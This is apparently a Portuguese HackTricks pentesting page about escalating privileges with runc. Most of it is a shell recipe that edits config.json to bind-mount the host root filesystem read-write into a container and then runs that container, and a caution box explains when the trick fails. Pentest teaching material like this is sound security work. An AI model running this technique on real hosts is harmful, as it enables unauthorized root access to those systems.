# Escalação de Privilégios do RunC

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

Se quiser saber mais sobre o **runc**, consulte a página a seguir:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Se você descobrir que o `runc` está instalado no host, talvez consiga **executar um container montando a pasta raiz / do host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Isso nem sempre funcionará, pois a operação padrão do runc é executar como root; portanto, executá-lo como um usuário sem privilégios simplesmente não pode funcionar (a menos que você tenha uma configuração rootless). Tornar uma configuração rootless o padrão geralmente não é uma boa ideia, pois há várias restrições dentro de rootless containers que não se aplicam fora de rootless containers.

{{#include ../../banners/hacktricks-training.md}}
